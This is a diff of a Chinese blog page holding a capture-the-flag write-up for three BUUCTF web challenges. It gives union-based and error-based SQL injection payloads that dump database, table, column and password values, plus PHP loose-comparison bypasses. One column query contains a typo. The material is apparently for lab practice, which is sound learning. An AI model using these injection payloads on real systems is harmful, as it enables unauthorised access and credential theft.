@@ -57,7 +57,7 @@
         <div class="content markdown">
             <h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>这关之前有做过类似的，但是这个应该是升级版</p>
 <p>进过尝试可知注入类型为单引号注入，用万能密码尝试登入</p>
-<p><img src="/2021/04/13/buuctf2/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf2\2.png" alt="2"></p>
+<p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\2.png" alt="2"></p>
 <p>发现这次flag不在里面了，那我们尝试一下获取他的数据库信息</p>
 <p><strong>法1：</strong></p>
 <p><strong>union联合注入</strong></p>
@@ -66,24 +66,24 @@
 <p>爆表：<code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;#</code></p>
 <p>爆列：<code>1&#39; union select 1,2,group_cooncat(columns) from information_schema.columns where table_name=&#39;geekuser&#39;#</code></p>
 <p>爆值：<code>1&#39; union select 1,2,group_concat(username,password) from geekuser#</code></p>
-<p><img src="/2021/04/13/buuctf2/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf2\5.png" alt="5"></p>
+<p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\5.png" alt="5"></p>
 <p>发现该表下只有一行数据：id=1,username=admin,password=“字符串”</p>
 <p>于是我们再查一下<code>l0ve1ysq1</code>表——<code>1&#39; union select 1,2,group_concat(username,password) from l0ve1ysq1#</code></p>
-<p><img src="/2021/04/13/buuctf2/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf2\6.png" alt="6"></p>
+<p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\6.png" alt="6"></p>
 <p><strong>法2：</strong></p>
 <p>报错注入：</p>
 <p>由于输入<code>1&#39;</code> 会返回报错信息，尝试报错注入：</p>
 <p>爆库：<code>1&#39; or extractvalue(1,concat(&#39;#&#39;,database()))#</code></p>
-<p><img src="/2021/04/13/buuctf2/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf2\1.png" alt="1"></p>
-<p>爆表：<code>1&#39; or extractvalue(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;)))#</code><img src="/2021/04/13/buuctf2/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf2\3.png" alt="3"></p>
+<p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\1.png" alt="1"></p>
+<p>爆表：<code>1&#39; or extractvalue(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;)))#</code><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\3.png" alt="3"></p>
 <p>爆列：<code>1&#39; or extractvalue(1,concat(&#39;#&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;geekuser&#39;)))#</code></p>
-<p><img src="/2021/04/13/buuctf2/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf2\4.png" alt="4"></p>
+<p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\4.png" alt="4"></p>
 <p>爆值：<code>1&#39; or extractvalue(1,concat(&#39;#&#39;,(select password from geekuser where id=1)))#</code></p>
 <p>发现返回一串字符串，但是flag不在其中，查看另一个表</p>
-<p><code>1&#39; or extractvalue(1,concat(&#39;#&#39;,(select password from l0ve1ysq1 where id=1)))#</code><img src="/2021/04/13/buuctf2/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf2\7.png" alt="7"></p>
+<p><code>1&#39; or extractvalue(1,concat(&#39;#&#39;,(select password from l0ve1ysq1 where id=1)))#</code><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\7.png" alt="7"></p>
 <p>发现由于报错注入的返回长度的限制，后续的值没有全部回显在页面上，因此要用substr函数去截，还挺麻烦的，后续的就不写了。</p>
 <h1 id="ACTF2020-新生赛-BackupFile（文件备份-弱口令绕过）"><a href="#ACTF2020-新生赛-BackupFile（文件备份-弱口令绕过）" class="headerlink" title="[ACTF2020 新生赛]BackupFile（文件备份+弱口令绕过）"></a>[ACTF2020 新生赛]BackupFile（文件备份+弱口令绕过）</h1><p>打开容器发现什么也没有，查看源码也没有，御剑扫描也没有，看到题目提示备份文件，联想到之前有做过以<code>.bak</code>为后缀的备份文件的题</p>
-<p><img src="/2021/04/13/buuctf2/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf2\8.png" alt="8"></p>
+<p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\8.png" alt="8"></p>
 <p>打开文件发现一段源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -96,13 +96,13 @@
 <p>var_dump(‘1233a’ == 123);//false</p>
 <p>var_dump(‘123a1’ == 123);//true</p>
 <p>因此这里我们只需要构造payload：?key=123即可</p>
-<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>点开容器，进入PAYFLAG页面，查看源码：<img src="/2021/04/13/buuctf2/9.png" alt="9"></p>
+<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>点开容器，进入PAYFLAG页面，查看源码：<img src="/buuctf2.assets/9.png" alt="9"></p>
 <p>我们需要上传money和password，根据网页提示money=100000000，password=404a绕过is_numeric和php弱口令相等</p>
-<p><img src="/2021/04/13/buuctf2/13.png" alt="13"></p>
+<p><img src="/buuctf2.assets/13.png" alt="13"></p>
 <p>没什么内容，抓包试试</p>
-<p><img src="/2021/04/13/buuctf2/10.png" alt="10"></p>
-<p>修改user的值为student，但是这样也不行，那改成1：<img src="/2021/04/13/buuctf2/11.png" alt="11"></p>
-<p>太长了，尝试改用科学计数法<img src="/2021/04/13/buuctf2/12.png" alt="12"></p>
+<p><img src="/buuctf2.assets/10.png" alt="10"></p>
+<p>修改user的值为student，但是这样也不行，那改成1：<img src="/buuctf2.assets/11.png" alt="11"></p>
+<p>太长了，尝试改用科学计数法<img src="/buuctf2.assets/12.png" alt="12"></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
